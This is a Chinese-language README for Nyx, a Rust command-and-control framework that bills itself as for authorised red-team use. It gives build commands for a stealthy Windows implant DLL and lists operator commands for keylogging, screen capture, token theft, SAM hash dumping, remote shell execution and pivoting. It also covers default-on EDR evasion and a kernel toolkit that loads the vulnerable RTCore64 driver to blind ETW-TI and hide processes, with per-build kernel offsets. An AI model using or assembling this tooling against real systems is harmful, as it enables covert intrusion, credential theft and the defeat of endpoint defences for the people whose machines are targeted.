# Nyx C2 Framework

> **授权红队 / 渗透测试专用。禁止在未获授权的系统上部署。**

Nyx 是一个纯 Rust 全栈 C2 框架，融合了 Cobalt Strike 的可扩展性与 Brute Ratel C4 的默认隐蔽性，并经过完整的代码安全审计（2026-07-05）。

---

## 功能概览

| 层 | 能力 |
|---|---|
| **加密协议** | X25519 ECDH + HKDF + ChaCha20-Poly1305；方向隔离 nonce；单调计数器防重放 |
| **团队服务器** | tokio/axum HTTP(S) 监听；命名操作员 + Bearer 鉴权；会话/任务队列；SQLite 凭据库；哈希链审计日志；Rhai 事件脚本；Malleable C2 profile |
| **Windows PIC 植入体** | ~16k LOC `no_std` DLL；25 个 Command 变体；间接 syscall + HWBP patchless blind + NTDLL unhook + Foliage 睡眠掩码 + 模块踩踏注入 + 反调试；全部默认 ARMED |
| **内核层 SDK** | BYOVD（RTCore64）+ 4 级页表遍历；ETW-TI 盲化；DKOM 进程隐藏；回调选择性中和；2 个真实 PatchGuard 窗口；KslD 动态设备枚举 |
| **桌面客户端** | Makepad GUI（`crates/client-ui`）+ ratatui TUI（`crates/client-cli`）；REST API；SOCKS5 relay |
| **脚本 / 扩展** | 嵌入式 Rhai 脚本；Malleable C2 profile（c2lint 验证）；BOF（CS ABI） |

---

## 项目结构

```
crates/
├── protocol/          # 加密协议（no_std，X25519+HKDF+ChaCha20-Poly1305）
├── server/            # 团队服务器（tokio/axum，鉴权，会话，审计）
├── store/             # SQLite 凭据库（rusqlite/WAL）
├── transport/         # TLS 握手嗅探（JA3/JA4）
├── rest/              # REST API 客户端库
├── parse/             # 协议解析工具
├── profile/           # Malleable C2 profile 解析 + c2lint
├── implant-win/       # Windows PIC 植入体（no_std/no_main，nightly，独立构建）
├── implant-evasionsdk/# 植入体逃避 SDK（Foliage/HookChain/HWBP）
├── operator-kernelsdk/# 内核级 EDR 绕过 SDK
├── operator-kernel-cli/# 内核层操作化 CLI
├── offset-resolver/   # EPROCESS 偏移自动解析（MS Symbol Server PDB 下载）
├── agent-dev/         # 标准 std 植入体（macOS 开发验证用）
├── client-cli/        # 操作员 TUI（ratatui）
├── client-ui/         # 桌面 GUI（Makepad）
├── bof-runner/        # BOF（CS ABI）加载器
├── coff/              # COFF/PE 解析
├── evasion/           # 间接 syscall stub 生成
├── scripting/         # 脚本事件总线
├── scripting-rhai/    # Rhai 脚本引擎绑定
└── config/            # 编译期配置宏
```

---

## 环境要求

| 工具 | 版本要求 | 用途 |
|---|---|---|
| Rust stable | ≥ 1.80 | 服务端 / 客户端 |
| Rust nightly | 任意 | 植入体（`implant-win`，`no_std`） |
| `x86_64-pc-windows-gnu` target | — | 植入体交叉编译 |
| `mingw-w64` | 16.1.0 推荐 | Windows 交叉链接器 |
| Windows Server 2019+ | — | 植入体真机运行 |

```bash
# 安装 Windows 交叉编译目标
rustup target add x86_64-pc-windows-gnu

# 安装 nightly（植入体专用）
rustup toolchain install nightly
rustup component add rust-src --toolchain nightly
```

---

## 快速上手

### 1. 构建并启动团队服务器

```bash
# 开发模式（HTTP，自动生成临时密钥对）
cargo run --release -p nyx-server

# 生产模式（持久密钥 + Bearer 鉴权 + TLS）
NYX_BIND=0.0.0.0:8443 \
NYX_KEYFILE=~/.nyx/server.key \
NYX_TOKEN=your_secret_token \
NYX_TLS=on \
cargo run --release -p nyx-server
```

服务器启动后输出 X25519 公钥（hex），烤入植入体构建时使用。

### 2. 构建 dev 植入体（macOS/Linux 验证回路）

```bash
export NYX_SERVER=http://127.0.0.1:8443
export NYX_SERVER_PUB=<服务器输出的公钥hex>
cargo run --release -p nyx-agent-dev
```

### 3. 构建 Windows PIC 植入体 DLL

```bash
# 检查编译（无需完整 Windows SDK）
cargo +nightly check -p nyx-implant-win --target x86_64-pc-windows-gnu

# 完整 Release 构建（需 mingw-w64 链接器）
cargo +nightly build --release -p nyx-implant-win \
  --target x86_64-pc-windows-gnu \
  -Z build-std=core,alloc
```

输出：`target/x86_64-pc-windows-gnu/release/nyx_implant_win.dll`（约 286 KB，已 strip）

> **编译期选项**
> - `NYX_FOLIAGE_OFF=1`：禁用 Foliage APC 睡眠掩码（rundll32 加载器上下文下需要）
> - `--cfg nyx_skip_sandbox`：跳过沙箱检测（SYSTEM context schtask 部署时使用）

### 4. 启动 TUI 操作员客户端

```bash
# 连接到本地服务器
cargo run --release -p nyx-cli -- --server http://127.0.0.1:8443

# 带 Bearer 鉴权
cargo run --release -p nyx-cli -- \
  --server https://your-server:8443 \
  --token your_secret_token
```

### 5. 启动桌面 GUI 客户端

```bash
cargo build --profile gui -p nyx-client-ui
./target/gui/nyx-client-ui
```

> 注意：GUI 必须用 `--profile gui`（优化级别 3 + 无 LTO）构建，使用 release profile 会在 macOS Metal/wgpu 初始化时触发 SIGSEGV。

---

## 服务器环境变量

| 变量 | 默认值 | 说明 |
|---|---|---|
| `NYX_BIND` | `0.0.0.0:8443` | 监听地址 |
| `NYX_KEYFILE` | —（每次随机） | 持久化 X25519 私钥文件（0600），重启后会话不丢失 |
| `NYX_TOKEN` | —（无鉴权） | `/api/*` 请求须携带 `Authorization: Bearer <token>` |
| `NYX_KILLDATE` | —（永不过期） | Unix 时间戳，过期后服务器拒绝所有 beacon |
| `NYX_TLS` | off | 设为 `on` 启用 TLS（rustls + ring，自签证书） |
| `NYX_PROFILE` | — | Malleable C2 profile 路径（c2lint 在加载时验证） |
| `NYX_SCRIPT` | — | Rhai 事件脚本（`on_session_new` / `on_result` / `on_session_exit`） |

---

## TUI 操作员命令速查

### 会话管理

```
/sessions              列出所有活跃会话（含 pid/age/pending/ja3/ja4）
/use <id>              选择当前操作会话
/info                  当前会话详情 overlay
/tasks                 当前会话任务队列
/rename <name>         重命名会话
/tag <tag>             为会话打标签
/star                  收藏当前会话
/note <text>           为会话添加备注
/topo                  会话拓扑视图
```

### 植入体任务命令（通过 beacon 循环下发）

```bash
# 文件系统
/ls [path]             目录列表
/cd <path>             改变目录
/mkdir <path>          新建目录
/cp <src> <dst>        复制文件
/mv <src> <dst>        移动/重命名
/rm <path>             删除文件/目录
/upload <local> <remote>   上传文件到植入体
/download <remote>     从植入体下载文件

# 执行
/shell <cmd>           通过 cmd.exe 执行 shell 命令
/bof <file.o> [args]   加载并执行 BOF（CS ABI）

# 侦察
/ps                    进程列表
/env [name]            环境变量（全部或指定）
/net ifconfig          网络接口
/net arp               ARP 表
/net routes            路由表
/net conn              活跃网络连接
/drive                 磁盘信息
/portscan <host> <ports>  端口扫描（250ms/port）
/screenshot            截取屏幕（跨会话，Task Scheduler）
/screenwatch           持续截图监控
/clipboard             读取剪贴板

# 权限
/getuid                当前身份
/steal <pid>           窃取进程令牌
/make_token <user> <domain> <pass>  创建模拟令牌
/rev2self              还原令牌

# 键盘记录
/keylog start          启动键盘记录
/keylog stop           停止键盘记录
/keylog dump           导出记录内容

# 哈希 dump
/hashdump              转储 SAM + SYSTEM hive（需 SYSTEM 权限）

# 植入体控制
/sleep <ms> [jitter%]  设置 beacon 间隔
/ping                  存活检测
/kill                  终止植入体
```

### 网络隧道 / 横向移动

```bash
/pivot connect <host:port>   建立 SOCKS5 connect 通道
/pivot bind <port>           SOCKS5 BIND 监听（反向 relay）
/chan close <id>             关闭 pivot 通道
/socks                       SOCKS5 桥接（operator 侧）
```

### 服务器控制 API

```bash
# 凭据管理
/creds add <user> <pass> [domain] [note]   添加凭据
/creds sync                                 同步凭据（掩码显示）
/creds sync reveal                          明文显示凭据
/creds del <id>                             删除凭据

# 审计日志
/audit                 查看操作日志（哈希链）
/audit verify          验证审计链完整性

# 其他
/profile               查看当前 Malleable C2 profile
/connect <url> [token] 连接到指定服务器
/help                  显示帮助
/clear                 清空控制台
```

---

## 内核层操作（operator-kernelsdk）

> 需要 BYOVD 可利用驱动（默认：RTCore64，CVE-2019-16098）+ SYSTEM 权限

```bash
# 内核层 CLI
cargo run -p nyx-operator-kernel-cli -- \
  --driver \\.\RTCore64 \
  --pid <target_pid> \
  bootstrap        # 完整引导链：BYOVD → 偏移解析 → ETW-TI 盲化 → DKOM → 回调中和
```

### 偏移自动解析

```bash
# 从 MS Symbol Server 自动下载 PDB 并解析 EPROCESS 偏移
cargo run -p nyx-offset-resolver -- \
  --guid <ntoskrnl_pdb_guid> \
  --age <age>
```

已内置偏移表（无需网络）：

| Windows Build | PID offset | Links offset | Protection offset |
|---|---|---|---|
| 17763（Server 2019 / Win10 1809） | `0x2e0` | `0x2e8` | `0x6ca` |
| 18362–19045（Win10） | `0x2e8` | `0x2f0` | `0x6fa` |
| 20348 / 22000 | `0x440` | `0x448` | `0x87a` |
| 22621 / 22631（Win11 22H2/23H2） | `0x440` | `0x448` | `0x87a` |
| 26100 / 26200（Win11 24H2/25H2） | `0x450` | `0x458` | `0x87e` |

---

## 构建与测试

```bash
# 工作区构建（服务端 + 客户端，macOS/Linux）
cargo build --workspace

# 全量测试
cargo test --workspace          # 326 通过 / 0 失败

# lint
cargo clippy -p nyx-cli -- -D warnings    # 零警告

# 植入体单独检查（需 nightly + Windows target）
cargo +nightly check -p nyx-implant-win \
  --target x86_64-pc-windows-gnu

# 内核 SDK 测试（独立 crate）
cargo test -p nyx-operator-kernelsdk     # 90 通过 / 4 平台 gate 预期失败

# Malleable C2 profile 验证
cargo run -p nyx-profile --bin c2lint -- <profile.c2>
```

---

## 线网协议格式

每次 beacon 请求体：

```
[32B 会话公钥][8B 计数器 LE][4B 密文长度 LE][密文 || 16B Poly1305 tag]
```

- 会话密钥 = `HKDF-SHA256(ECDH(implant_eph, server_id))`，绑定两端公钥
- AEAD = ChaCha20-Poly1305，96-bit nonce = 零填充计数器；公钥作为 AAD
- 防重放：单调计数器，写锁保护
- 方向隔离：`ClientToServer` / `ServerToClient` 使用不相交 nonce 空间

---

## 安全审计（2026-07-05）

代码库已于 2026-07-05 完成全量安全审计，覆盖 8 个子系统，修复 34 个文件：

| 子系统 | 修复项 | 核心内容 |
|---|---|---|
| 服务端 | NYX-SRV-01..05 | fail-closed 鉴权、RBAC Viewer 隔离、Slowloris 超时、审计链长度前缀、常数时间比较 |
| 协议 | NYX-PRO-01..05 | secrets zeroize on drop、字符串长度边界、CSPRNG write-once 状态 |
| 传输 | NYX-TRN-01..06 | GREASE 检测修正、JA4 指纹、TLS record 截断拒绝、证书验证标志 |
| 植入体核心 | NYX-CORE-01..03 | SPAWN 栈缓冲区扩大、BOF 参数安全解析、CONTEXT 结构偏移修正 |
| 植入体逃避 | NYX-EV-01..04 | CLR AMSI ETW 补丁路径、RWX→W→RX 保护转换、Foliage RX 页分配、Hyper-V RDTSC 检测 |
| 植入体注入 | NYX-INJ-01..02 | unsafe transmute 安全封装、BOF DataParseState 边界检查 |
| 植入体能力 | NYX-CAP-01..08 | 路径规范化绕过修复、SOCKS BIND 路由修正、WinStation 句柄生命周期、GetKeyState CapsLock、DeleteFileW 预清理、schtasks 去除硬编码用户名、端口扫描超时 250ms、HTTP 超限截断修复 |
| 内核 SDK | NYX-KERN-01..05 | kread 页边界分块、INVALID_HANDLE_VALUE 检测、Protection 单字节扫描、规范指针验证（×2） |

审计报告：`docs/audit_2026_07_05/`

---

## 真机验证状态

| 目标环境 | 测试项 | 结果 |
|---|---|---|
| Windows Server 2019（17763.1339）+ Defender ON | 完整 beacon 循环（加密 check-in → 任务下发 → 执行 → 加密回传） | ✅ 通过 |
| 同上 | 49/49 selftest 导出（`scripts/win_selftest_all.ps1`） | ✅ 全通过 |
| 同上 | 内核 SDK 7/7 任务（BYOVD + ETW-TI + DKOM + 回调中和） | ✅ 全通过 |
| 同上 | /screenshot 跨会话（Session 0 → Session 2，3.3MB BMP） | ✅ 通过 |
| 同上 | /hashdump SAM + SYSTEM hive（RegSaveKeyW fallback） | ✅ 通过 |
| Windows 11 24H2（build 26100，CI runner） | 植入体 + 内核 SDK 编译无回归 | ✅ 通过 |
| 同上 | HVCI-on / CET 硬件触发 | 🟡 需物理机（暂缓） |

---

## 已知限制

| 项 | 状态 | 说明 |
|---|---|---|
| Foliage `.text` APC 加密 | 🟡 降级 | rundll32 上下文下 APC 链破坏 GS cookie；`NYX_FOLIAGE_OFF=1` 降级为纯 sleep，heap 掩码保持 ON |
| 栈欺骗（SPOOF_SWAP） | 🔴 默认 OFF | CET-on 主机触发 `#CP`；CET 探测已实现，等 CET 物理机验证后开启 |
| WinHTTP TLS beacon | 🟡 调试中 | `WinHttpSetOption` 证书放宽路径；明文 HTTP beacon 正常 |
| MiniFilter 完整接线 | 🟡 部分 | `MiniFilterUnlinker` 算法完成；`flt_globals_kva` 解析需 fltmgr PDB RVA（operator 供给） |
| Win11 25H2 真机 | 🟡 暂缓 | 需 CET+HVCI 物理机 |

---

## Roadmap

- **P3**（团队 & 自动化）：多操作员实时协作、LDAP 侦察、横向移动 postex、UDC2
- **P4**（加固）：可重复构建、redirector 基础设施、QUIC 传输、Linux/macOS 植入体

---

## 免责声明

本项目仅用于授权安全测试和研究目的。**请勿在未明确授权的系统上部署或运行。**
